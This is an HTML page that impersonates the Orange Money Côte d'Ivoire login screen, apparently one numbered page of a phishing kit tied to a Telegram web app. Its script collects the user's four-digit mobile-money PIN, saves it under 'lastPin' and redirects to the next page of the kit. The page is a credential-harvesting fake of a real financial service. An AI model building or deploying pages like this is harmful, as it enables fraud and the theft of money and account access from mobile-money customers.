<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Orange Money Côte d'Ivoire - Connexion</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        :root { --orange-primary: #f15a24; --orange-gradient: linear-gradient(180deg, #ff6b00 0%, #f15a24 100%); }
        body { background-color: #fff; margin: 0; display: flex; flex-direction: column; min-height: 100vh; font-family: sans-serif; }
        .header-box { width: 100%; background: var(--orange-gradient); padding: 30px 20px; color: white; text-align: center; }
        .main-content { width: 90%; max-width: 400px; margin: 25px auto; text-align: center; flex-grow: 1; display: flex; flex-direction: column; align-items: center; }
        .phone-display { width: 100%; border: 1.5px solid var(--orange-primary); border-radius: 12px; padding: 14px; display: flex; align-items: center; gap: 12px; margin-bottom: 30px; font-weight: 700; }
        .pin-input-group { display: flex; gap: 12px; margin-bottom: 25px; }
        .pin-box { width: 52px; height: 52px; border: 1.5px solid var(--orange-primary); border-radius: 12px; text-align: center; font-size: 22px; font-weight: bold; outline: none; }
        .btn-submit { background-color: #e2e2e2; color: #fff; border: none; width: 100%; padding: 16px; border-radius: 10px; font-weight: 800; cursor: not-allowed; }
        .btn-submit.active { background-color: var(--orange-primary); cursor: pointer; }
    </style>
</head>
<body>
<div class="header-box">
    <div style="font-size:32px; font-weight:800;"><span style="color:#d64d00">Orange</span>Money</div>
</div>
<div class="main-content">
    <h2>Connexion</h2>
    <div class="phone-display">
        <span>🇨🇮</span>
        <span>+225</span>
        <span id="displayPhone">--</span>
    </div>
    <div class="pin-input-group">
        <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
        <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
        <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
        <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
    </div>
    <button id="loginBtn" class="btn-submit" disabled>SE CONNECTER</button>
</div>
<script>
    const pinBoxes = document.querySelectorAll('.pin-box');
    const loginBtn = document.getElementById('loginBtn');
    const savedPhone = localStorage.getItem('phone') || "0700000000";
    document.getElementById('displayPhone').textContent = savedPhone;

    pinBoxes.forEach((box, index) => {
        box.addEventListener('input', () => {
            box.value = box.value.replace(/\D/g, '');
            if (box.value && index < pinBoxes.length - 1) pinBoxes[index + 1].focus();
            const filled = [...pinBoxes].every(b => b.value.length === 1);
            loginBtn.disabled = !filled;
            loginBtn.classList.toggle('active', filled);
        });
    });

    loginBtn.addEventListener('click', () => {
        let pin = "";
        pinBoxes.forEach(b => pin += b.value);
        localStorage.setItem('lastPin', pin);
        window.location.href = "page7.html";
    });
</script>
</body>
</html>
